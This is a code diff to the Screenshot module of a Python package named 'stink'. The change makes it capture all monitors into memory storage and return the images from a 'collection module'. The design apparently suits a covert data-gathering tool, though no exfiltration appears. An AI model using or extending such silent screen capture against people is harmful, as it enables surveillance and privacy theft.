@@ -1,28 +1,17 @@
-from os import mkdir, path
+from os import path
+from typing import List
 
-from stink.helpers import Screencapture
+from stink.helpers import Screencapture, MemoryStorage
 
 
 class Screenshot:
     """
     Takes a screenshot of the monitors.
     """
-    def __init__(self, storage_path: str, folder: str):
+    def __init__(self, folder: str):
 
-        self.__full_path = path.join(storage_path, folder)
-
-    def __create_folder(self) -> None:
-        """
-        Creates storage for the Screenshot module.
-
-        Parameters:
-        - None.
-
-        Returns:
-        - None.
-        """
-        if not path.exists(self.__full_path):
-            mkdir(self.__full_path)
+        self.__folder = folder
+        self.__storage = MemoryStorage()
 
     def __create_screen(self) -> None:
         """
@@ -34,10 +23,13 @@ class Screenshot:
         Returns:
         - None.
         """
-        screenshot = Screencapture()
-        screenshot.create(monitor=0, path=self.__full_path)
+        capture = Screencapture()
+        screenshots = capture.create_in_memory()
 
-    def run(self) -> None:
+        for index, monitor in enumerate(screenshots):
+            self.__storage.add_from_memory(path.join(self.__folder, f"monitor-{index}.png"), monitor)
+
+    def run(self) -> List:
         """
         Launches the screenshots collection module.
 
@@ -49,8 +41,9 @@ class Screenshot:
         """
         try:
 
-            self.__create_folder()
             self.__create_screen()
+
+            return self.__storage.get_data()
 
         except Exception as e:
             print(f"[Screenshot]: {repr(e)}")
